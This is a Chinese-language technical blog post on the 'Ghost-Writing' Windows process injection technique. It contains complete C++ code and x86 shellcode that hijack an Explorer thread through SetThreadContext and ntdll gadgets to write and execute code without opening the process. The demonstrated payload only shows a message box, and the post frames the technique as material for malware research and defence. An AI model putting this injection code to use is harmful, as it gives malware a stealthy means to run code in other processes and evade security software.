---
title: Windows进程注入技术总结(二)
author: iaB
categories:
- Windows
tags: 
- Inject 
date: 2021-02-26 07:30:00
excerpt: 进程注入技术经常被恶意代码用来进行隐藏自身敏感行为,或获得更高的权限使用.了解各种注入技术有助于对恶意代码的研究以及防护,这篇文章来介绍一下Ghost-Writing注入.
---

# 概述  
现如今,大量的恶意代码多使用远线程注入技术去躲避安全软件的检测,隐藏自身的恶意行为,又或者为取地更高级别的权限.想要进行注入,也就意味着要将想要执行的代码写进目标进程的内存空间当中,它有可能作为一个dll被加载,也有可能作为数据直接写入到目标进程当中.有一项被称为Ghost-Writing的方式,提供了一种新的思路去将数据写入到目标进程当中.它进行了一项挑战,即在不打开目标进程的前提下(不调用OpenProcess,NtOpenProcess 或其他操作进程的函数),将数据写入到目标进程当中(实际上它没有打开进程而是操作了线程 :D ),更甚至不会调用任何写入内存的函数(不调用WriteProcessMemory,NtWriteVirtualMemory),并且该方法不需要提权,使用任意权限都可以生效.它的作者c0de90e7,在2007年将其公布.下面一边看实现代码一边解释一下它的工作原理.  
# 原理简述  
这类方法主要是通过类似ROP链的方式,在ntdll(或者其他dll)中寻找可用的代码,这段代码做写操作,然后可以通过控制栈控制其返回值,来不断使用这段代码对任意位置进行写操作.从而代替了写内存功能的api调用  
# Ghost-Writing  
首先是shellcode.因为主要是介绍注入的原理,所以shellcode选择了x86版本的一个简单的代码(弹出一个MessageBox).  
```cpp
unsigned char injcted_code[] = {
0x6A,0x00,                                                      // PUSH 0
0xE8,0x0D,0x00,0x00,0x00,                                       // CALL NEXT (push caption 指针)
'G','h','o','s','t','W','r','i','t','i','n','g',0x00,           //(messagebox caption)
0xE8,0x1D,0x00,0x00,0x00,                                       // CALL NEXT (push text 指针)
'R','u','n','n','i','n','g',' ','i','n','t','o',' ','E','X',    //(messagebox text)
'P','L','O','R','E','R','.','E','X','E','.','.','.',0x00,
0x6A,0x00,                                                      // PUSH 0
0x56,                                                           // PUSH ESI    (MessageBoxA 的返回地址，我们通过控制ESI来控制这个地址)
0x68,0x00,0x00,0x00,0x00,                                       // PUSH MessageBoxA    (在使用前会将次地址修正为函数地址)
0xC3                                                            // RET (call MessageBoxA)
};
```

在注入的过程中,需要线程运行在一个稳定并且可控的状态,所以利用了jmp self(EB FE  JMP $),在线程运行完每一步操作后使epi停留在jmp $上,使线程形成了一种自锁状态.以便我们能够在一个可控的状态下继续操作线程.  
```cpp
//等待线程运行到自锁状态
//arg1:目标线程句柄
//arg2:目标线程的环境块
//arg3:目标窗口的句柄
//arg4:jmp self的地址

void wait_for_thread_autolock(HANDLE thread_handle, CONTEXT* p_thread_context, HWND thread_windows_handle, DWORD auto_lock_eip)
{
	if (!(SetThreadContext(thread_handle, p_thread_context)))
	{
		printf("SetThreadContext failure.\n");
	}

	do {
		ResumeThread(thread_handle);
		Sleep(30);								//这里sleep(0)也可以
		SuspendThread(thread_handle);
		GetThreadContext(thread_handle, p_thread_context);
	} while (p_thread_context->Eip != auto_lock_eip);
}
```

为了稳定性和方便控制,对进行写操作的指令进行一些规则限定:  
- 指令的形式为 MOV [REG1],REG2 或者 MOV [REG1+xx],REG2  
- 寄存器必须是 EBX,EBP,ESI,EDI 其中一个  
- 两个寄存器不能相同  

```cpp
//这个函数是在内存中寻找MOV [REG1],REG2 或者 MOV [REG1+xx],REG2
//arg1:寻找指令的内存基址
//arg2:寻找指令的基于基址的偏移
//arg3:目标线程的环境块
//arg4:寻找的指令的目标寄存器,在目标线程环境块中的指针
//arg5:寻找的指令的源寄存器,在目标线程环境块中的指针
//arg6:如果指令是MOV [REG1],REG2则该变量返回0,如果指令是MOV [REG1+xx],REG2则该变量返回xx

int disassemble_and_validate_mov(PUCHAR instruction_memory_base, ULONG* instruction_memory_index, CONTEXT* p_thread_context, DWORD** write_pointer, DWORD** write_item, int* mov_offset_from_memory_register)
{
    UCHAR write_pointer_reg_index, write_item_reg_index;                         //用来记录找到的指令解析出来的寄存器下标
    UCHAR modrm;                                                                 //用来记录Opcode中ModRM结构
    
    DWORD* array_of_valid_register_addresses_in_context[8];                      //使用数组去标记哪些寄存器可用哪些寄存器不可用
    array_of_valid_register_addresses_in_context[0] = NULL;                      // EAX, not valid.
    array_of_valid_register_addresses_in_context[1] = NULL;                      // ECX, not valid.
    array_of_valid_register_addresses_in_context[2] = NULL;                      // EDX, not valid.
    array_of_valid_register_addresses_in_context[3] = &p_thread_context->Ebx;    // EBX, valid
    array_of_valid_register_addresses_in_context[4] = NULL;                      // ESP, valid.   但是不使用
    array_of_valid_register_addresses_in_context[5] = &p_thread_context->Ebp;    // EBX, valid.
    array_of_valid_register_addresses_in_context[6] = &p_thread_context->Esi;    // ESI, valid.
    array_of_valid_register_addresses_in_context[7] = &p_thread_context->Edi;    // EDI, valid.

    if (instruction_memory_base[*instruction_memory_index] == 0x89)    // 是否是 "MOV /r" 指令
    {
        modrm = instruction_memory_base[*instruction_memory_index + 1];    //如果是则开始进行OPcode的解析,去下一个字节ModRM去解析Mod dstRM srcRM.

        if ((modrm & 0x80) != 0)    // 我们需要 Mod域为 00或01.
            return FALSE;

        write_pointer_reg_index = modrm & 0x07;        //记录目的寄存器
        write_item_reg_index = (modrm >> 3) & 0x07;    //记录源寄存器

        if (write_pointer_reg_index == write_item_reg_index)    //判断两个寄存器是否相同
            return FALSE;

        if ((modrm & 0x40) == 0)    //如果是 "MOV [REG1],REG2" 的形式.
        {
            if (write_pointer_reg_index == 5)    // 当是 "MOV [REG1],REG2"形式时,RM域为5则变成了"MOV [immediate32],REG2"所以排除掉.
                return FALSE;

            *mov_offset_from_memory_register = 0;

            *instruction_memory_index += 2;
        }
        else                        //如果是"MOV [REG1+xx],REG2"的形式.
        {
            *mov_offset_from_memory_register = (signed char)instruction_memory_base[*instruction_memory_index + 2];
            * instruction_memory_index += 3;
        }

        //最后检查两个寄存器的值是否在我们一开始预设好的可用寄存器当中
        if ((array_of_valid_register_addresses_in_context[write_pointer_reg_index] != NULL) && (array_of_valid_register_addresses_in_context[write_item_reg_index] != NULL))
        {
            *write_pointer = array_of_valid_register_addresses_in_context[write_pointer_reg_index];
            *write_item = array_of_valid_register_addresses_in_context[write_item_reg_index];
        }
        else
            return FALSE;

        return TRUE;
    }
    else
        return FALSE;
}
```

需要提到的是,刚刚的函数只是为了寻找符合要求的mov指令,而我们实际需要从其他dll中获取的指令分为两种  
> - *JMP $*
> - *MOV [REG1],REG2 / MOV [REG1+xx],REG2*  
>  *RET*
>  为了更加灵活,也可以是  
>  *MOV [REG1],REG2 / MOV [REG1+xx],REG2*  
>  *POP REGx*  
>  *POP REGx*  
>  *ADD ESP,xx*  
>  *..*  
>  *RET*  

做好准备工作,可以开始进行注入的主要过程了.  
```cpp
//注入函数
//arg1:目标线程句柄
//arg2:注入的代码指针
//arg3:注入的代码大小(单位是dword)
//arg4:目标线程的窗口句柄

int inject(HANDLE thread_handle, DWORD* injected_code, ULONG number_of_dwords_to_inject, HWND thread_window_handle)
{
    DWORD* write_pointer = nullptr;         //接收 mov指令中的目标操作寄存器在线程context中相应位置的指针
    DWORD* write_item = nullptr;            //接收 mov指令中的源操作寄存器在线程context中相应位置的指针
    int mov_offset_from_memory_register;    //寻找MOV指令函数的传出参数，如果找到的是mov [reg],reg 则被置为0，如果找到的是mov [reg+xx],reg 则被置为xx

    HMODULE ntdll_handle = 0;
    DWORD NtProtectVirtualMemory_address = 0;    //用来过DEP使用
    PUCHAR ntdll_code_address = 0;
    PIMAGE_NT_HEADERS ntdll_peheader_pointer = 0;
    ULONG ntdll_code_size, i, j, k;
    
    //准备在ntdll当中寻找需要的指令(mov/jmp$)
    ntdll_handle = GetModuleHandleA("NTDLL.DLL");
    if (!ntdll_handle)
    {
        printf("Can`t get ntdll handle.\n");
        return FALSE;
    }

    NtProtectVirtualMemory_address = (DWORD)GetProcAddress(ntdll_handle, "NtProtectVirtualMemory"); 
    if (!NtProtectVirtualMemory_address)
    {
        printf("Can`t get ntdll handle.\n");
        return FALSE;
    }

    ntdll_code_address = (PUCHAR)((ULONG)ntdll_handle + 0x00001000);              //我们默认ntdll代码起始位置是0x1000
    ntdll_peheader_pointer = (PIMAGE_NT_HEADERS)((ULONG)ntdll_handle + ((IMAGE_DOS_HEADER*)ntdll_handle)->e_lfanew);
    ntdll_code_size = ntdll_peheader_pointer->OptionalHeader.SizeOfCode;

    CONTEXT saved_thread_context = { 0 };    //保存被注入的线程环境，用来恢复线程的执行
    CONTEXT working_thread_context = { 0 };  //保存注入过程中的线程环境

    DWORD jmp_to_self_address = 0, mov_ret_address = 0;       //保存寻找到的 JMP $ 和 MOV + RET的代码地址
    ULONG number_of_bytes_to_pop_after_mov_before_ret = 0;    // 保存mov ret代码需要使用的栈大小,因为可能含有POP操作,所以要准确计算需要预留出多少栈空间.

    i = 0;  //用作在ntdll中寻找可用代码时的指针偏移
    
    //在ntdll中寻找需要得指令
    while ((i < ntdll_code_size) && ((!jmp_to_self_address) || (!mov_ret_address))) 
    {
        if (!jmp_to_self_address)
        {
            if ((ntdll_code_address[i] == 0xEB) && (ntdll_code_address[i + 1] == 0xFE))    // EB FE 检查是不是 JMP $
            {
                jmp_to_self_address = (DWORD)&ntdll_code_address[i];
                i += 1;
            }
        }

        if (!mov_ret_address)
        { 
            if (disassemble_and_validate_mov(ntdll_code_address, &i, &working_thread_context, &write_pointer, &write_item, &mov_offset_from_memory_register))
            {
                j = i;
                k = 0;//用来累加mov后到ret的指令需要使用多少栈空间，平栈时使用

                while (j < i + 16) //寻找到的mov指令，后续寻找范围16个字节
                {
                    if (((ntdll_code_address[j] & 0xF8) == 0x58) && (ntdll_code_address[j] != 0x5C))    //检查是不是pop指令
                    {
                        k += 4;
                        j += 1;
                        continue;
                    }

                    if ((ntdll_code_address[j] == 0x83) && ((ntdll_code_address[j + 1] & 0xF8) == 0xC0))    // 检查是不是 add reg,yy指令
                    {
                        if (ntdll_code_address[j + 1] == 0xC4)    //判断reg是不是esp
                            k += (signed char)ntdll_code_address[j + 2];

                        j += 3;
                        continue;
                    }

                    if ((ntdll_code_address[j] == 0xC3) || ((ntdll_code_address[j] == 0xC2) && (ntdll_code_address[j + 2] == 0x00)))    // 判断是不是ret指令
                    {

                        if (mov_offset_from_memory_register == 0)
                            mov_ret_address = (DWORD)&ntdll_code_address[i - 2];
                        else                                   
                            mov_ret_address = (DWORD)&ntdll_code_address[i - 3];

                        number_of_bytes_to_pop_after_mov_before_ret = k;

                        i = j + 3;    // we increment i so that it points ahead this pattern
                        break;    // and we finish the subsearch
                    }

                    break;   //如果不是pop 不是 add reg,yy直接跳出
                }
            }
        }

        i++;
    }

    //已经取得了要利用得指令片段,我们开始注入!~
    if ((jmp_to_self_address) && (mov_ret_address))
    {
        SuspendThread(thread_handle);    //将目标线程挂起
        
        //保存两份环境上下文,一份用于恢复执行,另一份用于注入时使用
        saved_thread_context.ContextFlags = CONTEXT_FULL;
        working_thread_context.ContextFlags = CONTEXT_FULL;

        GetThreadContext(thread_handle, &saved_thread_context);
        GetThreadContext(thread_handle, &working_thread_context);
        
        //这时我们要对挂起的线程的栈空间进行设计
        //1.首先我们要修改EIP到MOVRET指令,将JMP$指令设置为当前MOVRET的返回地址,使线程进入自锁状态
        //2.当线程进入自锁状态后,要使用 NtProtectVirtualMemory 函数去修改接下来一块栈空间的内存属性,因为我们要在这块内存中执行InjectCode
        //3.执行InjectCode
        //所以,我们设计的栈空间需要包括,MOVRET指令需要的栈空间 + JMP$地址 + NtProtectVirtualMemory使用的栈空间 + InjectCode
        //如下图:
        //  初始的栈                                        修改后的栈
        //  ____________________                         ______________________
        // |                    |<--- 栈底              |                      |<--- 栈底
        // |                    |                       |                      |
        // |                    |                       |                      |
        // |                    |                       |                      |
        // |                    |                       |______________________|
        // |                    |                       |                      |<--- ESP
        // |                    |                       | MOVRET使用的栈空间   |
        // |                    |                       |______________________|
        // |                    |                       |                      |
        // |                    |                       |    JMP$指令地址      |
        // |                    |                       |______________________|
        // |                    |                       |                      |
        // |                    |                       |                      |
        // |                    |                       |NtProtectVirtualMemory|
        // |                    |                       |       使用栈         |
        // |                    |                       |                      |
        // |                    |                       |______________________|
        // |                    |                       |                      |
        // |                    |                       |                      |
        // |                    |                       |    Inject Code       |
        // |                    |                       |                      |
        // |____________________|                       |______________________|
        // |                    |<--- ESP               |                      |<--- 原ESP
        // |                    |                       |                      |
        // |                    |                       |                      |
        // |                    |                       |                      |
        // | 原程序已经使用的栈 |                       | 原程序已经使用的栈   |
        // |                    |                       |                      |
        // |                    |                       |                      |
        // |                    |                       |                      |
        // |                    |                       |                      |
        // |____________________|<--- 栈顶              |______________________|<--- 栈顶

        //拉出一部份我们将要使用的栈空间
        DWORD base_of_written_bytes;
        base_of_written_bytes = working_thread_context.Esp - ((number_of_dwords_to_inject * sizeof(DWORD)) + //Inject Code 
                                                               ((1 + 5 + 3) * sizeof(DWORD)) +                //NtProtectVirtualMemory参数+返回地址 这里的1 5 3 在后面解释
                                                               sizeof(DWORD) +                                //lpJMP$
                                                               number_of_bytes_to_pop_after_mov_before_ret);  //MOVRET使用的栈

        //首先 将JMP$地址写入指定位置用于MOVREG指令的返回值,让程序执行完MOVRET指令后进入自锁状态
        * write_pointer = base_of_written_bytes - mov_offset_from_memory_register + number_of_bytes_to_pop_after_mov_before_ret;      //指定MOV [REG1],REG2的目标操作数(考虑到了MOV [REG1+xx],REG2需要添加xx偏移)
        working_thread_context.Esp = base_of_written_bytes;
        working_thread_context.Eip = mov_ret_address;
        *write_item = jmp_to_self_address;
        wait_for_thread_autolock(thread_handle, &working_thread_context, thread_window_handle, jmp_to_self_address);//执行线程，写入返回地址，并返回到写入的JMP $,函数返回

        //然后构造NtProtectVirtualMemory所使用的栈空间
        // NtProtectVirtualMemory(    IN HANDLE ProcessHandle,
        //                            IN OUT PVOID *BaseAddress,
        //                            IN OUT PULONG NumberOfBytesToProtect,
        //                            IN ULONG NewAccessProtection,
        //                            OUT PULONG OldAccessProtection );
        //得知我们需要1个返回值+5个参数+3个指针参数指向的数据,所以栈空间使这样的
        // | RET ADDR           |
        // | p.1: ProcessHandle |
        // | p.2: &BaseAddress -----------.
        // | p.3: &NumBytesProt --------. |
        // | p.4: NewAccessProt |       | |
        // | p.5: &OldAccessPrt ----.   | |
        // | BaseAddress        |<--+---+-.
        // | NumBytesProt       |<--+---.
        // | OldAccessPrt       |<--.

        DWORD NtProtectVirtualMemory_call_stack[1 + 5 + 3] = { 0,           // 返回地址，我们要将这个地址修改成 JMP $的地址
                                                    0xFFFFFFFF,             // ProcessHandle
                                                    0,                      // &BaseAddress
                                                    0,                      // &NumBytesProt
                                                    PAGE_EXECUTE_READWRITE, // NewAccessProt
                                                    0,                      // &OldAccessPrt
                                                    0,                      // BaseAddress
                                                    0,                      // NumBytesProt
                                                    0 };                    // OldAccessPrt

        NtProtectVirtualMemory_call_stack[0] = jmp_to_self_address;
        NtProtectVirtualMemory_call_stack[2] = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + sizeof(DWORD) + ((1 + 5 + 0) * sizeof(DWORD));
        NtProtectVirtualMemory_call_stack[3] = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + sizeof(DWORD) + ((1 + 5 + 1) * sizeof(DWORD));
        NtProtectVirtualMemory_call_stack[5] = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + sizeof(DWORD) + ((1 + 5 + 2) * sizeof(DWORD));
        NtProtectVirtualMemory_call_stack[6] = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + sizeof(DWORD) + ((1 + 5 + 3) * sizeof(DWORD));
        NtProtectVirtualMemory_call_stack[7] = number_of_dwords_to_inject * sizeof(DWORD);

        //然后利用MOVRET把这9个DWORD写到栈中
        DWORD DWORD_writing_pointer = 0;
        DWORD_writing_pointer = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + sizeof(DWORD);

        for (i = 0;i < 9;i++)
        {
            working_thread_context.Esp = base_of_written_bytes;
            *write_pointer = DWORD_writing_pointer - mov_offset_from_memory_register;
            *write_item = NtProtectVirtualMemory_call_stack[i];
            working_thread_context.Eip = mov_ret_address;
            wait_for_thread_autolock(thread_handle, &working_thread_context, thread_window_handle, jmp_to_self_address);
            DWORD_writing_pointer += sizeof(DWORD);
        }
        
        //接下来将Injectcode也写入到预留好的栈当中
        DWORD InjectedCodeExecutionStart;
        InjectedCodeExecutionStart = DWORD_writing_pointer;     	//准备执行Inject Code时使用

        //写入injected code
        for (i = 0;i < number_of_dwords_to_inject;i++)
        {
            working_thread_context.Esp = base_of_written_bytes;
            *write_pointer = DWORD_writing_pointer - mov_offset_from_memory_register;
            *write_item = injected_code[i];
            working_thread_context.Eip = mov_ret_address;
            wait_for_thread_autolock(thread_handle, &working_thread_context, thread_window_handle, jmp_to_self_address);
            DWORD_writing_pointer += sizeof(DWORD);
        }

        //内存数据都准备好了,可以开始执行了,先执行NtProtectVirtualMemory
        working_thread_context.Esp = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + sizeof(DWORD); 
        working_thread_context.Eip = NtProtectVirtualMemory_address;
        wait_for_thread_autolock(thread_handle, &working_thread_context, thread_window_handle, jmp_to_self_address);

        //再执行InjectCode,也可以进行优化,将NtProtectVirtualMemory的返回地址直接指向InjectCode的起始位置
        working_thread_context.Esp = base_of_written_bytes;
        working_thread_context.Esi = jmp_to_self_address;
        working_thread_context.Ebx = base_of_written_bytes;
        working_thread_context.Eip = InjectedCodeExecutionStart;
        wait_for_thread_autolock(thread_handle, &working_thread_context, thread_window_handle, jmp_to_self_address);    // and... RUN !!!

        //我们的payload也被设计成返回到JMP$,所以当wait_for_thread_autolock函数返回,就可以恢复线程原来的状态了.

        SetThreadContext(thread_handle, &saved_thread_context);
        ResumeThread(thread_handle);
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}
```

完美!所有核心部分都已经完成,最后拼装一下.  
```cpp
int main()
{
    //在user32.dll中获取MessageBoxA的函数地址
    DWORD messageboxa_address = 0;
    HMODULE user32_handle = LoadLibraryA("USER32.DLL");
    if (!user32_handle)
    {
        printf("Can`t get user32 handle.\n");
        return 0;
    }
    else
    {
        messageboxa_address = (DWORD)GetProcAddress(user32_handle, "MessageBoxA");
        FreeLibrary(user32_handle);
    }
    
    if (!messageboxa_address)
    {
        printf("Can`t get MessageBoxA address.\n");
        return 0;
    }
    else
    {
        *(DWORD*)(&injcted_code[58]) = messageboxa_address;		//填充inject code中的函数地址
    }
    
    //利用GetShellWindow去获得Explorer的线程句柄
    HWND shellwindow_handle = 0;
    shellwindow_handle = GetShellWindow();
    if (!shellwindow_handle)
    {
        printf("Can`t get Shell window handle.\n");
        return 0;
    }
    DWORD shellwindow_thread_id = 0;
    shellwindow_thread_id = GetWindowThreadProcessId(shellwindow_handle, NULL);
    if (!shellwindow_thread_id)
    {
        printf("Can`t get Shell windows thread id.\n");
        return 0;
    }

    HANDLE target_thread_handle = 0;
    target_thread_handle = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, shellwindow_thread_id);
    if (!target_thread_handle)
    {
        printf("Can`t get target thread handle.\n");
        return 0;
    }

    //对目标线程进行注入
    if (inject(target_thread_handle, (DWORD*)injcted_code, (sizeof(injcted_code) + 4) / 4, shellwindow_handle))
    {
        printf("Ghost writing success.\n");
    }
    else
    {
        printf("Ghost writing failure.\n");
    }

    return 0;
}
```
完成！神不知鬼不觉~ 最后上个效果图！  

![](/pic/iab/ProcessInject_2/TEST.gif)

# 总结
这种注入方式使用了大量的SetThreadContext来控制代码组成ROP链,代替传统得写操作,和执行操作,相比上古时期的CreatRemoteThread显得十分有趣,虽然时间上也很久远,但是在如今仍然非常有效,并且完全可以修改成X64的版本,而且不需要高权限,可以在现如今大部分windows版本上运行.  



















